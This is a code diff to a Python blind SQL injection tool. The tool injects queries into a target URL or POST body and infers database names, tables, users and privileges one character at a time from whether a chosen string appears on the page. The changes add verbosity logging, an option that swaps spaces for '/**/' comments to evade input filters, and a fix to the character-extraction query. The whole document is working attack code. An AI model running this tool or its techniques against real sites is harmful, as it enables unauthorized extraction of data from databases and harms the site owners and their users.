@@ -11,7 +11,9 @@ p.add_argument( '-u' , '--url'              , required = True          , help = 
 p.add_argument( '-p' , '--post'             , metavar = 'POST'         , help = 'to send POST data use this var'  )
 p.add_argument( '-c' , '--cookie'           , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
 p.add_argument( '-s' , '--string'           , required = True          , help = 'string to search on the page'    )
-p.add_argument( '-e' , '--engine'           , default = 'mysql', choices = ['mysql', 'postgres'], help = 'engine of database' )
+p.add_argument( '-e' , '--engine'           , default = 'mysql', choices = ['mysql', 'postgres'], help = 'engine of database'  )
+p.add_argument( '-v' , '--verbose'          , action = 'append_const' , const = 1, default = [],  help = 'how much verbose should be output' )
+p.add_argument( '-a' , '--avoid'            , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
 p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
 p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
 p.add_argument( '-U' , metavar = 'TABLE'    , help = 'username to use' )
@@ -43,8 +45,12 @@ class Searcher( object ):
     def test( self, sql ):
         url  = self.url.replace( '@', quote_plus( sql ) )
         post = self.post and self.post.replace( '@', quote_plus( sql ) )
-        self.log( 3, '...testing url=%s POST=%s' % ( url, post ) )
-        return self.sss in urlopen( url, post ).read()
+        self.log( 2, '...testing url=%s POST=%s' % ( url, post ) )
+
+        html = urlopen( url, post ).read()
+        self.log( 3, '----html----\n%s\n----html----\n' % html )
+
+        return self.sss in html
 
 
     def get_number( self, sql, lmin = None, lmax = None ):
@@ -113,7 +119,7 @@ class Searcher( object ):
         self.log( 0, '...', newline = False )
         res = ''
         for i in xrange( l ):
-            c = self.get_number( 'ASCII(SUBSTRING(%s,%s))' % ( sql, i+1 ), lmin = lmin, lmax = lmax )
+            c = self.get_number( 'ASCII(SUBSTRING(%s,%s,1))' % ( sql, i+1 ), lmin = lmin, lmax = lmax )
             res += chr( c )
             self.log( 0, chr( c ), newline = False )
         self.log( 0, '' )
@@ -139,6 +145,12 @@ class SQL:
         l = map( lambda c: hex( ord( c ) )[ 2: ], s )
         return '0x' + ''.join( l )
 
+    def prepare( self, s ):
+        for c in args.avoid:
+            if c == ' ':
+                s = s.replace( ' ', '/**/' )
+        return '(%s)' % s
+
     def __call__( self, name, **kargs ):
         s = self.arr[ self.eng ][ name ]
 
@@ -147,14 +159,13 @@ class SQL:
                 if type( v ) is str:
                     kargs[ k ] = self.my_hex( v )
 
-            s = '(%s)' % ( s.replace( ' ', '/**/' ) % kargs )
-        return s
+        return self.prepare( s ) % kargs
 
 s = Searcher( url = args.url,
               sss = args.string,
               post = args.post,
               th_num = 1,
-              log_lvl = 0 )
+              log_lvl = len( args.verbose ) )
 sql = SQL( args.engine )
 
 
@@ -210,4 +221,4 @@ elif get == 'privs':
         s.get( sql( 'privs', i = i, user = user ) )
 
 elif args.sql:
-    s.get( '(%s)' % args.sql.replace( ' ', '/**/' ) )
+    s.get( sql.prepare( args.sql ) )
